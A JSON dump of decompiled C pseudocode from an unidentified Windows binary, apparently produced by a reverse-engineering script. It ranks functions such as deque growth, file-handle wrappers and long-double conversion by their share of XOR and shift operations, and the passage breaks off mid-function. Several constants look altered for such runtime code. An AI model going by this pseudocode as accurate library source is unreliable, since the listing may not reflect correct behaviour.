[
    {
        "Function": "sub_35BB3210",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "14.29%",
        "Function Body": "\nunsigned int __thiscall sub_35BB3210(_DWORD *this)\n{\n  return this[1] % 0x10u + *(_DWORD *)(*(_DWORD *)(*this + 4) + 4 * ((*(_DWORD *)(*this + 8) - 1) & (this[1] >> 4)));\n}\n\n"
    },
    {
        "Function": "sub_35E1BAC0",
        "Total XOR and shift operations": 8,
        "XOR operations": 0,
        "Shift operations": 8,
        "Operation percentage": "13.33%",
        "Function Body": "\nunsigned int __thiscall sub_35E1BAC0(int this, unsigned int a2)\n{\n  unsigned int result; // eax\n  int v3; // [esp+28h] [ebp+0h]\n  void *Src; // [esp+40h] [ebp+18h]\n  int v5; // [esp+48h] [ebp+20h]\n  char *v6; // [esp+64h] [ebp+3Ch]\n  unsigned int v7; // [esp+8Ch] [ebp+64h]\n  unsigned int i; // [esp+90h] [ebp+68h]\n  char *v9; // [esp+94h] [ebp+6Ch]\n  unsigned int v11; // [esp+A4h] [ebp+7Ch]\n\n  if ( *(_DWORD *)(this + 8) )\n    v5 = *(_DWORD *)(this + 8);\n  else\n    v5 = 1;\n  for ( i = v5; i - *(_DWORD *)(this + 8) < a2 || i < 8; i *= 2 )\n  {\n    if ( 0xFF2EE8F - i < i )\n      std::_Xlength_error(\"deque<T> too long\");\n  }\n  v11 = i - *(_DWORD *)(this + 8);\n  v7 = *(_DWORD *)(this + 12) >> 4;\n  if ( i > 0x3FF2EE8F || (v6 = (char *)operator new(4 * i)) == 0 )\n    unknown_libname_3();\n  v3 = *(_DWORD *)(this + 4) + 4 * *(_DWORD *)(this + 8);\n  Src = (void *)(*(_DWORD *)(this + 4) + 4 * v7);\n  v9 = (char *)memmove(&v6[4 * v7], Src, 4 * ((v3 - (int)Src) >> 2)) + 4 * ((v3 - (int)Src) >> 2);\n  if ( v7 > v11 )\n  {\n    memmove(v9, *(const void **)(this + 4), 4 * ((int)(4 * v11) >> 2));\n    memset(\n      (char *)memmove(\n                v6,\n                (const void *)(*(_DWORD *)(this + 4) + 4 * v11),\n                4 * ((int)(*(_DWORD *)(this + 4) + 4 * v7 - (*(_DWORD *)(this + 4) + 4 * v11)) >> 2))\n    + 4 * ((int)(*(_DWORD *)(this + 4) + 4 * v7 - (*(_DWORD *)(this + 4) + 4 * v11)) >> 2),\n      0,\n      4 * v11);\n  }\n  else\n  {\n    memset(\n      (char *)memmove(v9, *(const void **)(this + 4), 4 * ((int)(4 * v7) >> 2)) + 4 * ((int)(4 * v7) >> 2),\n      0,\n      4 * (v11 - v7));\n    memset(v6, 0, 4 * v7);\n  }\n  if ( *(_DWORD *)(this + 4) )\n    j__free(*(void **)(this + 4));\n  *(_DWORD *)(this + 4) = v6;\n  result = v11 + *(_DWORD *)(this + 8);\n  *(_DWORD *)(this + 8) = result;\n  return result;\n}\n// 35194054: conditional instruction was optimized away because %var_C.4>=8u\n// 354776AC: using guessed type void __noreturn unknown_libname_3(void);\n\n"
    },
    {
        "Function": "sub_358513A0",
        "Total XOR and shift operations": 8,
        "XOR operations": 0,
        "Shift operations": 8,
        "Operation percentage": "13.33%",
        "Function Body": "\nunsigned int __thiscall sub_358513A0(int this, unsigned int a2)\n{\n  unsigned int result; // eax\n  int v3; // [esp+28h] [ebp+0h]\n  void *Src; // [esp+40h] [ebp+18h]\n  int v5; // [esp+48h] [ebp+20h]\n  char *v6; // [esp+64h] [ebp+3Ch]\n  unsigned int v7; // [esp+8Ch] [ebp+64h]\n  unsigned int i; // [esp+90h] [ebp+68h]\n  char *v9; // [esp+94h] [ebp+6Ch]\n  unsigned int v11; // [esp+A4h] [ebp+7Ch]\n\n  if ( *(_DWORD *)(this + 8) )\n    v5 = *(_DWORD *)(this + 8);\n  else\n    v5 = 1;\n  for ( i = v5; i - *(_DWORD *)(this + 8) < a2 || i < 8; i *= 2 )\n  {\n    if ( 0xFF2EE8F - i < i )\n      std::_Xlength_error(\"deque<T> too long\");\n  }\n  v11 = i - *(_DWORD *)(this + 8);\n  v7 = *(_DWORD *)(this + 12) >> 2;\n  if ( i > 0x3FF2EE8F || (v6 = (char *)operator new(4 * i)) == 0 )\n    unknown_libname_3();\n  v3 = *(_DWORD *)(this + 4) + 4 * *(_DWORD *)(this + 8);\n  Src = (void *)(*(_DWORD *)(this + 4) + 4 * v7);\n  v9 = (char *)memmove(&v6[4 * v7], Src, 4 * ((v3 - (int)Src) >> 2)) + 4 * ((v3 - (int)Src) >> 2);\n  if ( v7 > v11 )\n  {\n    memmove(v9, *(const void **)(this + 4), 4 * ((int)(4 * v11) >> 2));\n    memset(\n      (char *)memmove(\n                v6,\n                (const void *)(*(_DWORD *)(this + 4) + 4 * v11),\n                4 * ((int)(*(_DWORD *)(this + 4) + 4 * v7 - (*(_DWORD *)(this + 4) + 4 * v11)) >> 2))\n    + 4 * ((int)(*(_DWORD *)(this + 4) + 4 * v7 - (*(_DWORD *)(this + 4) + 4 * v11)) >> 2),\n      0,\n      4 * v11);\n  }\n  else\n  {\n    memset(\n      (char *)memmove(v9, *(const void **)(this + 4), 4 * ((int)(4 * v7) >> 2)) + 4 * ((int)(4 * v7) >> 2),\n      0,\n      4 * (v11 - v7));\n    memset(v6, 0, 4 * v7);\n  }\n  if ( *(_DWORD *)(this + 4) )\n    j__free(*(void **)(this + 4));\n  *(_DWORD *)(this + 4) = v6;\n  result = v11 + *(_DWORD *)(this + 8);\n  *(_DWORD *)(this + 8) = result;\n  return result;\n}\n// 3593A036: conditional instruction was optimized away because %var_C.4>=8u\n// 354776AC: using guessed type void __noreturn unknown_libname_3(void);\n\n"
    },
    {
        "Function": "sub_355F1CCD",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "7.50%",
        "Function Body": "\nint __cdecl sub_355F1CCD(int FileHandle)\n{\n  int v1; // edi\n  int v2; // edi\n\n  if ( FileHandle == -2 )\n  {\n    *__doserrno() = 0;\n    *_errno() = 9;\n    return -1;\n  }\n  if ( FileHandle < 0\n    || FileHandle >= (unsigned int)dword_35E83660\n    || (v1 = (FileHandle & 0x1F) << 6, (*(_BYTE *)(dword_35099EF0[FileHandle >> 5] + v1 + 4) & 1) == 0) )\n  {\n    *__doserrno() = 0;\n    *_errno() = 9;\n    _invalid_parameter_noinfo();\n    return -1;\n  }\n  __lock_fhandle(FileHandle);\n  if ( (*(_BYTE *)(dword_35099EF0[FileHandle >> 5] + v1 + 4) & 1) != 0 )\n  {\n    v2 = _close_nolock(FileHandle);\n  }\n  else\n  {\n    *_errno() = 9;\n    v2 = -1;\n  }\n  _unlock_fhandle(FileHandle);\n  return v2;\n}\n// 35B9224F: using guessed type _DWORD __cdecl __lock_fhandle(_DWORD);\n// 3590F8EF: using guessed type _DWORD __cdecl _unlock_fhandle(_DWORD);\n// 35099EF0: using guessed type int dword_35099EF0[64];\n// 35E83660: using guessed type int dword_35E83660;\n\n"
    },
    {
        "Function": "sub_35FFF580",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "7.41%",
        "Function Body": "\nvoid **__thiscall sub_35FFF580(int this, unsigned int a2)\n{\n  void **result; // eax\n  unsigned int v3; // [esp+8h] [ebp-Ch]\n  size_t v4; // [esp+Ch] [ebp-8h]\n  size_t v5; // [esp+Ch] [ebp-8h]\n\n  result = (void **)this;\n  if ( *(_DWORD *)(this + 8) - *(_DWORD *)(this + 4) < a2 )\n  {\n    if ( -1 - (*(_DWORD *)(this + 4) - *(_DWORD *)this) < a2 )\n      std::_Xlength_error(\"vector<T> too long\");\n    v4 = *(_DWORD *)(this + 8) - *(_DWORD *)this;\n    if ( -1 - (v4 >> 1) >= v4 )\n      v3 = v4 + (v4 >> 1);\n    else\n      v3 = 0;\n    v5 = v3;\n    if ( v3 < a2 + *(_DWORD *)(this + 4) - *(_DWORD *)this )\n      v5 = a2 + *(_DWORD *)(this + 4) - *(_DWORD *)this;\n    return sub_35860170((void **)this, v5);\n  }\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_35BC7584",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "7.32%",
        "Function Body": "\nint __cdecl sub_35BC7584(int a1, const void *a2, DWORD nNumberOfBytesToWrite)\n{\n  int v3; // edi\n  int v4; // edi\n\n  if ( a1 == -2 )\n  {\n    *__doserrno() = 0;\n    *_errno() = 9;\n    return -1;\n  }\n  if ( a1 < 0\n    || a1 >= (unsigned int)dword_35E83660\n    || (v3 = (a1 & 0x1F) << 6, (*(_BYTE *)(dword_35099EF0[a1 >> 5] + v3 + 4) & 1) == 0) )\n  {\n    *__doserrno() = 0;\n    *_errno() = 9;\n    _invalid_parameter_noinfo();\n    return -1;\n  }\n  __lock_fhandle(a1);\n  if ( (*(_BYTE *)(dword_35099EF0[a1 >> 5] + v3 + 4) & 1) != 0 )\n  {\n    v4 = sub_35258D66(a1, a2, nNumberOfBytesToWrite);\n  }\n  else\n  {\n    *_errno() = 9;\n    *__doserrno() = 0;\n    v4 = -1;\n  }\n  _unlock_fhandle(a1);\n  return v4;\n}\n// 35B9224F: using guessed type _DWORD __cdecl __lock_fhandle(_DWORD);\n// 3590F8EF: using guessed type _DWORD __cdecl _unlock_fhandle(_DWORD);\n// 35099EF0: using guessed type int dword_35099EF0[64];\n// 35E83660: using guessed type int dword_35E83660;\n\n"
    },
    {
        "Function": "sub_35776727",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "7.32%",
        "Function Body": "\nint __cdecl sub_35776727(int FileHandle, LONG lDistanceToMove, DWORD dwMoveMethod)\n{\n  int v3; // edi\n  int v4; // edi\n\n  if ( FileHandle == -2 )\n  {\n    *__doserrno() = 0;\n    *_errno() = 9;\n    return -1;\n  }\n  if ( FileHandle < 0\n    || FileHandle >= (unsigned int)dword_35E83660\n    || (v3 = (FileHandle & 0x1F) << 6, (*(_BYTE *)(dword_35099EF0[FileHandle >> 5] + v3 + 4) & 1) == 0) )\n  {\n    *__doserrno() = 0;\n    *_errno() = 9;\n    _invalid_parameter_noinfo();\n    return -1;\n  }\n  __lock_fhandle(FileHandle);\n  if ( (*(_BYTE *)(dword_35099EF0[FileHandle >> 5] + v3 + 4) & 1) != 0 )\n  {\n    v4 = _lseek_nolock(FileHandle, lDistanceToMove, dwMoveMethod);\n  }\n  else\n  {\n    *_errno() = 9;\n    *__doserrno() = 0;\n    v4 = -1;\n  }\n  _unlock_fhandle(FileHandle);\n  return v4;\n}\n// 35B9224F: using guessed type _DWORD __cdecl __lock_fhandle(_DWORD);\n// 3590F8EF: using guessed type _DWORD __cdecl _unlock_fhandle(_DWORD);\n// 35099EF0: using guessed type int dword_35099EF0[64];\n// 35E83660: using guessed type int dword_35E83660;\n\n"
    },
    {
        "Function": "sub_35FFB760",
        "Total XOR and shift operations": 1,
        "XOR operations": 0,
        "Shift operations": 1,
        "Operation percentage": "7.14%",
        "Function Body": "\nunsigned int __thiscall sub_35FFB760(int **this)\n{\n  int v2; // [esp+Ch] [ebp-8h]\n\n  if ( *this )\n    v2 = **this;\n  else\n    v2 = 0;\n  return (unsigned int)this[2] % 0x10\n       + *(_DWORD *)(*(_DWORD *)(v2 + 4) + 4 * ((*(_DWORD *)(v2 + 8) - 1) & ((unsigned int)this[2] >> 4)));\n}\n\n"
    },
    {
        "Function": "sub_35E29C44",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "6.98%",
        "Function Body": "\nunsigned int __cdecl sub_35E29C44(int FileHandle)\n{\n  int v1; // ebx\n  unsigned int LastError; // esi\n  void *osfhandle; // eax\n\n  if ( FileHandle != -2 )\n  {\n    if ( FileHandle < 0\n      || FileHandle >= (unsigned int)dword_35E83660\n      || (v1 = (FileHandle & 0x1F) << 6, (*(_BYTE *)(v1 + dword_35099EF0[FileHandle >> 5] + 4) & 1) == 0) )\n    {\n      *_errno() = 9;\n      _invalid_parameter_noinfo();\n      return -1;\n    }\n    __lock_fhandle(FileHandle);\n    LastError = 0;\n    if ( (*(_BYTE *)(v1 + dword_35099EF0[FileHandle >> 5] + 4) & 1) != 0 )\n    {\n      osfhandle = (void *)_get_osfhandle(FileHandle);\n      if ( !FlushFileBuffers(osfhandle) )\n        LastError = GetLastError();\n      if ( !LastError )\n        goto LABEL_12;\n      *__doserrno() = LastError;\n    }\n    *_errno() = 9;\n    LastError = -1;\nLABEL_12:\n    _unlock_fhandle(FileHandle);\n    return LastError;\n  }\n  *_errno() = 9;\n  return -1;\n}\n// 35B9224F: using guessed type _DWORD __cdecl __lock_fhandle(_DWORD);\n// 3590F8EF: using guessed type _DWORD __cdecl _unlock_fhandle(_DWORD);\n// 35099EF0: using guessed type int dword_35099EF0[64];\n// 35E83660: using guessed type int dword_35E83660;\n\n"
    },
    {
        "Function": "sub_35EDD300",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "6.45%",
        "Function Body": "\n_DWORD *__thiscall sub_35EDD300(_DWORD *this, _BYTE *a2)\n{\n  _DWORD *result; // eax\n  unsigned int v3; // [esp+10h] [ebp-14h]\n  _BYTE *v4; // [esp+14h] [ebp-10h]\n  int v5; // [esp+18h] [ebp-Ch]\n  void *v6; // [esp+1Ch] [ebp-8h]\n\n  if ( !((this[4] + this[3]) % 0x10u) && this[2] <= (unsigned int)(this[4] + 16) >> 4 )\n    sub_35E1BAC0((int)this, 1u);\n  this[3] &= 16 * this[2] - 1;\n  v3 = this[4] + this[3];\n  v5 = (this[2] - 1) & (v3 >> 4);\n  if ( !*(_DWORD *)(this[1] + 4 * v5) )\n  {\n    v6 = operator new(0x10u);\n    if ( !v6 )\n      unknown_libname_3();\n    *(_DWORD *)(this[1] + 4 * v5) = v6;\n  }\n  v4 = (_BYTE *)(*(_DWORD *)(this[1] + 4 * v5) + v3 % 0x10);\n  if ( v4 )\n    *v4 = *a2;\n  result = this;\n  ++this[4];\n  return result;\n}\n// 354776AC: using guessed type void __noreturn unknown_libname_3(void);\n\n"
    },
    {
        "Function": "sub_35BAD607",
        "Total XOR and shift operations": 22,
        "XOR operations": 0,
        "Shift operations": 22,
        "Operation percentage": "6.15%",
        "Function Body": "\nint __cdecl sub_35BAD607(unsigned __int16 *a1, _DWORD *a2)\n{\n  unsigned __int16 v2; // dx\n  int v3; // edx\n  _DWORD *v4; // edi\n  int v5; // ebx\n  int v6; // esi\n  int v7; // eax\n  int v8; // edx\n  int v9; // ecx\n  bool i; // zf\n  unsigned int v11; // eax\n  bool v12; // cf\n  unsigned int v13; // eax\n  int v14; // ecx\n  int v15; // edx\n  unsigned int v16; // eax\n  int v17; // eax\n  int v18; // ecx\n  int v19; // eax\n  char v20; // di\n  int v21; // eax\n  unsigned int v22; // edx\n  int *v23; // edx\n  int v24; // eax\n  int k; // ecx\n  int v26; // edx\n  char v27; // cl\n  bool m; // zf\n  unsigned int v29; // eax\n  int v30; // ecx\n  unsigned int v31; // eax\n  int v32; // edx\n  unsigned int v33; // eax\n  int v34; // eax\n  int v35; // edx\n  int v36; // ecx\n  int v37; // eax\n  unsigned int v38; // eax\n  int *v39; // edx\n  int n; // ecx\n  int v41; // ecx\n  int v42; // edi\n  unsigned int v43; // eax\n  unsigned int v44; // edx\n  int *v45; // edx\n  int j; // ecx\n  int v47; // ecx\n  int v48; // esi\n  unsigned int v49; // eax\n  int *v50; // edx\n  int v51; // ecx\n  unsigned int v52; // esi\n  int v53; // eax\n  int v55; // [esp+Ch] [ebp-44h]\n  int v56; // [esp+14h] [ebp-3Ch]\n  int v57; // [esp+14h] [ebp-3Ch]\n  unsigned int v58; // [esp+18h] [ebp-38h]\n  char v59; // [esp+18h] [ebp-38h]\n  int v60; // [esp+18h] [ebp-38h]\n  int v61; // [esp+18h] [ebp-38h]\n  int v62; // [esp+1Ch] [ebp-34h]\n  int v63; // [esp+1Ch] [ebp-34h]\n  int v64; // [esp+1Ch] [ebp-34h]\n  char v65; // [esp+20h] [ebp-30h]\n  int v66; // [esp+24h] [ebp-2Ch]\n  int v67; // [esp+28h] [ebp-28h]\n  int v68; // [esp+28h] [ebp-28h]\n  char v69; // [esp+28h] [ebp-28h]\n  int v70; // [esp+28h] [ebp-28h]\n  int v71; // [esp+2Ch] [ebp-24h]\n  unsigned int v72; // [esp+2Ch] [ebp-24h]\n  int v73; // [esp+30h] [ebp-20h]\n  int v74; // [esp+30h] [ebp-20h]\n  int v75; // [esp+30h] [ebp-20h]\n  int v76; // [esp+30h] [ebp-20h]\n  int v77; // [esp+30h] [ebp-20h]\n  int v78; // [esp+34h] [ebp-1Ch]\n  int v79; // [esp+38h] [ebp-18h]\n  int v80; // [esp+3Ch] [ebp-14h]\n  int v81; // [esp+40h] [ebp-10h] BYREF\n  int v82; // [esp+44h] [ebp-Ch]\n  int v83; // [esp+48h] [ebp-8h] BYREF\n\n  v2 = a1[5];\n  v55 = v2 & 0x8000;\n  v81 = *(_DWORD *)(a1 + 3);\n  v82 = *(_DWORD *)(a1 + 1);\n  v3 = (v2 & 0x7FFF) - 0x3FFF;\n  v4 = a2;\n  v5 = 0;\n  v73 = v3;\n  v83 = *a1 << 16;\n  if ( v3 == -16383 )\n  {\n    v6 = 0;\n    v7 = 0;\n    while ( !*(&v81 + v7) )\n    {\n      if ( ++v7 >= 3 )\n        goto LABEL_84;\n    }\n    v81 = 0;\n    v82 = 0;\n    v83 = 0;\n  }\n  else\n  {\n    v78 = v81;\n    v79 = v82;\n    v71 = v3;\n    v62 = dword_35270168 - 1;\n    v80 = v83;\n    v8 = dword_35270168 / 32;\n    v66 = 0;\n    v56 = dword_35270168 / 32;\n    v9 = 31 - dword_35270168 % 32;\n    v65 = v9;\n    if ( ((1 << v9) & *(&v81 + dword_35270168 / 32)) != 0 )\n    {\n      for ( i = (~(-1 << v9) & *(&v81 + v8)) == 0; i; i = *(&v81 + v8) == 0 )\n      {\n        if ( ++v8 >= 3 )\n          goto LABEL_24;\n      }\n      v66 = 0;\n      v58 = 1 << (31 - v62 % 32);\n      v11 = *(&v81 + v62 / 32);\n      v12 = v11 + v58 < v11;\n      v13 = v11 + v58;\n      v14 = 0;\n      if ( v12 || v13 < v58 )\n      {\n        v14 = 1;\n        v66 = 1;\n      }\n      v15 = v62 / 32 - 1;\n      for ( *(&v82 + v15) = v13; v15 >= 0; *(&v82 + v15) = v17 )\n      {\n        if ( !v14 )\n          break;\n        v16 = *(&v81 + v15);\n        v14 = 0;\n        v12 = v16 + 1 < v16;\n        v66 = 0;\n        v17 = v16 + 1;\n        if ( v12 || !v17 )\n        {\n          v14 = 1;\n          v66 = 1;\n        }\n        --v15;\n      }\n      LOCD9A(v9) = v65;\nLABEL_24:\n      v8 = v56;\n    }\n    *(&v81 + v8) &= -1 << v9;\n    if ( v8 + 1 < 3 )\n      memset(&v81 + v8 + 1, 0, 4 * (3 - (v8 + 1)));\n    v18 = v73;\n    if ( v66 )\n      v18 = v73 + 1;\n    if ( v18 >= dword_35270164 - dword_35270168 )\n    {\n      if ( v18 > dword_35270164 )\n      {\n        if ( v18 < dword_35270160 )\n        {\n          v81 &= ~0x80741900;\n          v61 = v18 + dword_35270174;\n          v70 = dword_3527016C / 32;\n          v47 = dword_3527016C % 32;\n          v77 = 0;\n          v48 = 0;\n          do\n          {\n            v49 = *(&v81 + v48++);\n            *(&v80 + v48) = v77 | (v49 >> v47);\n            v77 = (~(-1 << v47) & v49) << (32 - v47);\n          }\n          while ( v48 < 3 );\n          v6 = v61;\n          v50 = &v83 - v70;\n          v51 = 2;\n          v5 = 0;\n          do\n          {\n            if ( v51 < v70 )\n              *(&v81 + v51) = 0;\n            else\n              *(&v81 + v51) = *v50;\n            --v50;\n            --v51;\n          }\n          while ( v51 >= 0 );\n        }\n        else\n        {\n          v82 = 0;\n          v83 = 0;\n          v81 = 0x80741900;\n          v64 = dword_3527016C / 32;\n          v41 = dword_3527016C % 32;\n          v60 = dword_3527016C % 32;\n          v42 = ~(-1 << (dword_3527016C % 32));\n          v76 = 0;\n          v69 = 32 - dword_3527016C % 32;\n          do\n          {\n            v43 = *(&v81 + v5);\n            v44 = v43 >> v41;\n            LOCD9A(v41) = v60;\n            *(&v81 + v5++) = v76 | v44;\n            v76 = (v42 & v43) << v69;\n          }\n          while ( v5 < 3 );\n          v45 = &v83 - v64;\n          for ( j = 2; j >= 0; --j )\n          {\n            if ( j < v64 )\n              *(&v81 + j) = 0;\n            else\n              *(&v81 + j) = *v45;\n            --v45;\n          }\n          v6 = dword_35270160 + dword_35270174;\n          v5 = 1;\n        }\n        goto LABEL_83;\n      }\n      v81 = v78;\n      v82 = v79;\n      v57 = (dword_35270164 - v71) / 32;\n      v83 = v80;\n      v19 = (dword_35270164 - v71) % 32;\n      v20 = v19;\n      v74 = 0;\n      v67 = ~(-1 << v19);\n      v59 = 32 - v19;\n      do\n      {\n        v21 = (v67 & *(&v81 + v5)) << v59;\n        v22 = v74 | ((unsigned int)*(&v81 + v5++) >> v20);\n        *(&v80 + v5) = v22;\n        v74 = v21;\n      }\n      while ( v5 < 3 );\n      v23 = &v83 - v57;\n      v24 = v57;\n      for ( k = 2; k >= 0; --k )\n      {\n        if ( k < v24 )\n        {\n          *(&v81 + k) = 0;\n        }\n        else\n        {\n          *(&v81 + k) = *v23;\n          v24 = v57;\n        }\n        --v23;\n      }\n      v26 = (v62 + 1) / 32;\n      v27 = 31 - (v62 + 1) % 32;\n      if ( ((1 << v27) & *(&v81 + v26)) != 0 )\n      {\n        for ( m = (~(-1 << v27) & *(&v81 + v26)) == 0; m; m = *(&v81 + v26) == 0 )\n        {\n          if ( ++v26 >= 3 )\n            goto LABEL_56;\n        }\n        v29 = *(&v81 + v62 / 32);\n        v30 = 0;\n        v72 = 1 << (31 - v62 % 32);\n        v12 = v29 + v72 < v29;\n        v31 = v29 + v72;\n        if ( v12 || v31 < v72 )\n          v30 = 1;\n        v32 = v62 / 32 - 1;\n        for ( *(&v82 + v32) = v31; v32 >= 0; *(&v82 + v32) = v34 )\n        {\n          if ( !v30 )\n            break;\n          v33 = *(&v81 + v32);\n          v30 = 0;\n          v12 = v33 + 1 < v33;\n          v34 = v33 + 1;\n          if ( v12 || !v34 )\n            v30 = 1;\n          --v32;\n        }\n        v27 = 31 - (v62 + 1) % 32;\nLABEL_56:\n        v26 = (v62 + 1) / 32;\n      }\n      *(&v81 + v26) &= -1 << v27;\n      v35 = v26 + 1;\n      if ( v35 < 3 )\n        memset(&v81 + v35, 0, 4 * (3 - v35));\n      v68 = (dword_3527016C + 1) / 32;\n      v36 = (dword_3527016C + 1) % 32;\n      v37 = 0;\n      v75 = 0;\n      v63 = 0;\n      do\n      {\n        v38 = *(&v81 + v37);\n        *(&v81 + v63) = v75 | (v38 >> v36);\n        v75 = (~(-1 << v36) & v38) << (32 - v36);\n        v37 = v63 + 1;\n        v63 = v37;\n      }\n      while ( v37 < 3 );\n      v39 = &v83 - v68;\n      for ( n = 2; n >= 0; --n )\n      {\n        if ( n < v68 )\n          *(&v81 + n) = 0;\n        else\n          *(&v81 + n) = *v39;\n        --v39;\n      }\n    }\n    else\n    {\n      v81 = 0;\n      v82 = 0;\n      v83 = 0;\n    }\n    v6 = 0;\n  }\n  v5 = 2;\nLABEL_83:\n  v4 = a2;\nLABEL_84:\n  v52 = v81 | (v55 != 0 ? 0x80741900 : 0) | (v6 << (31 - dword_3527016C));\n  if ( dword_35270170 == 64 )\n  {\n    v53 = v82;\n    v4[1] = v52;\n    *v4 = v53;\n  }\n  else if ( dword_35270170 == 32 )\n  {\n    *v4 = v52;\n  }\n  return v5;\n}\n// 35270160: using guessed type int dword_35270160;\n// 35270164: using guessed type int dword_35270164;\n// 35270168: using guessed type int dword_35270168;\n// 3527016C: using guessed type int dword_3527016C;\n// 35270170: using guessed type int dword_35270170;\n// 35270174: using guessed type int dword_35270174;\n\n"
    },
    {
        "Function": "sub_35583C77",
        "Total XOR and shift operations": 22,
        "XOR operations": 0,
        "Shift operations": 22,
        "Operation percentage": "6.15%",
        "Function Body": "\nint __cdecl sub_35583C77(unsigned __int16 *a1, _DWORD *a2)\n{\n  unsigned __int16 v2; // dx\n  int v3; // edx\n  _DWORD *v4; // edi\n  int v5; // ebx\n  int v6; // esi\n  int v7; // eax\n  int v8; // edx\n  int v9; // ecx\n  bool i; // zf\n  unsigned int v11; // eax\n  bool v12; // cf\n  unsigned int v13; // eax\n  int v14; // ecx\n  int v15; // edx\n  unsigned int v16; // eax\n  int v17; // eax\n  int v18; // ecx\n  int v19; // eax\n  char v20; // di\n  int v21; // eax\n  unsigned int v22; // edx\n  int *v23; // edx\n  int v24; // eax\n  int k; // ecx\n  int v26; // edx\n  char v27; // cl\n  bool m; // zf\n  unsigned int v29; // eax\n  int v30; // ecx\n  unsigned int v31; // eax\n  int v32; // edx\n  unsigned int v33; // eax\n  int v34; // eax\n  int v35; // edx\n  int v36; // ecx\n  int v37; // eax\n  unsigned int v38; // eax\n  int *v39; // edx\n  int n; // ecx\n  int v41; // ecx\n  int v42; // edi\n  unsigned int v43; // eax\n  unsigned int v44; // edx\n  int *v45; // edx\n  int j; // ecx\n  int v47; // ecx\n  int v48; // esi\n  unsigned int v49; // eax\n  int *v50; // edx\n  int v51; // ecx\n  unsigned int v52; // esi\n  int v53; // eax\n  int v55; // [esp+Ch] [ebp-44h]\n  int v56; // [esp+14h] [ebp-3Ch]\n  int v57; // [esp+14h] [ebp-3Ch]\n  unsigned int v58; // [esp+18h] [ebp-38h]\n  char v59; // [esp+18h] [ebp-38h]\n  int v60; // [esp+18h] [ebp-38h]\n  int v61; // [esp+18h] [ebp-38h]\n  int v62; // [esp+1Ch] [ebp-34h]\n  int v63; // [esp+1Ch] [ebp-34h]\n  int v64; // [esp+1Ch] [ebp-34h]\n  char v65; // [esp+20h] [ebp-30h]\n  int v66; // [esp+24h] [ebp-2Ch]\n  int v67; // [esp+28h] [ebp-28h]\n  int v68; // [esp+28h] [ebp-28h]\n  char v69; // [esp+28h] [ebp-28h]\n  int v70; // [esp+28h] [ebp-28h]\n  int v71; // [esp+2Ch] [ebp-24h]\n  unsigned int v72; // [esp+2Ch] [ebp-24h]\n  int v73; // [esp+30h] [ebp-20h]\n  int v74; // [esp+30h] [ebp-20h]\n  int v75; // [esp+30h] [ebp-20h]\n  int v76; // [esp+30h] [ebp-20h]\n  int v77; // [esp+30h] [ebp-20h]\n  int v78; // [esp+34h] [ebp-1Ch]\n  int v79; // [esp+38h] [ebp-18h]\n  int v80; // [esp+3Ch] [ebp-14h]\n  int v81; // [esp+40h] [ebp-10h] BYREF\n  int v82; // [esp+44h] [ebp-Ch]\n  int v83; // [esp+48h] [ebp-8h] BYREF\n\n  v2 = a1[5];\n  v55 = v2 & 0x8000;\n  v81 = *(_DWORD *)(a1 + 3);\n  v82 = *(_DWORD *)(a1 + 1);\n  v3 = (v2 & 0x7FFF) - 0x3FFF;\n  v4 = a2;\n  v5 = 0;\n  v73 = v3;\n  v83 = *a1 << 16;\n  if ( v3 == -16383 )\n  {\n    v6 = 0;\n    v7 = 0;\n    while ( !*(&v81 + v7) )\n    {\n      if ( ++v7 >= 3 )\n        goto LABEL_84;\n    }\n    v81 = 0;\n    v82 = 0;\n    v83 = 0;\n  }\n  else\n  {\n    v78 = v81;\n    v79 = v82;\n    v71 = v3;\n    v62 = dword_35270180 - 1;\n    v80 = v83;\n    v8 = dword_35270180 / 32;\n    v66 = 0;\n    v56 = dword_35270180 / 32;\n    v9 = 31 - dword_35270180 % 32;\n    v65 = v9;\n    if ( ((1 << v9) & *(&v81 + dword_35270180 / 32)) != 0 )\n    {\n      for ( i = (~(-1 << v9) & *(&v81 + v8)) == 0; i; i = *(&v81 + v8) == 0 )\n      {\n        if ( ++v8 >= 3 )\n          goto LABEL_24;\n      }\n      v66 = 0;\n      v58 = 1 << (31 - v62 % 32);\n      v11 = *(&v81 + v62 / 32);\n      v12 = v11 + v58 < v11;\n      v13 = v11 + v58;\n      v14 = 0;\n      if ( v12 || v13 < v58 )\n      {\n        v14 = 1;\n        v66 = 1;\n      }\n      v15 = v62 / 32 - 1;\n      for ( *(&v82 + v15) = v13; v15 >= 0; *(&v82 + v15) = v17 )\n      {\n        if ( !v14 )\n          break;\n        v16 = *(&v81 + v15);\n        v14 = 0;\n        v12 = v16 + 1 < v16;\n        v66 = 0;\n        v17 = v16 + 1;\n        if ( v12 || !v17 )\n        {\n          v14 = 1;\n          v66 = 1;\n        }\n        --v15;\n      }\n      LOCD9A(v9) = v65;\nLABEL_24:\n      v8 = v56;\n    }\n    *(&v81 + v8) &= -1 << v9;\n    if ( v8 + 1 < 3 )\n      memset(&v81 + v8 + 1, 0, 4 * (3 - (v8 + 1)));\n    v18 = v73;\n    if ( v66 )\n      v18 = v73 + 1;\n    if ( v18 >= dword_3527017C - dword_35270180 )\n    {\n      if ( v18 > dword_3527017C )\n      {\n        if ( v18 < dword_35270178 )\n        {\n          v81 &= ~0x80741900;\n          v61 = v18 + dword_3527018C;\n          v70 = dword_35270184 / 32;\n          v47 = dword_35270184 % 32;\n          v77 = 0;\n          v48 = 0;\n          do\n          {\n            v49 = *(&v81 + v48++);\n            *(&v80 + v48) = v77 | (v49 >> v47);\n            v77 = (~(-1 << v47) & v49) << (32 - v47);\n          }\n          while ( v48 < 3 );\n          v6 = v61;\n          v50 = &v83 - v70;\n          v51 = 2;\n          v5 = 0;\n          do\n          {\n            if ( v51 < v70 )\n              *(&v81 + v51) = 0;\n            else\n              *(&v81 + v51) = *v50;\n            --v50;\n            --v51;\n          }\n          while ( v51 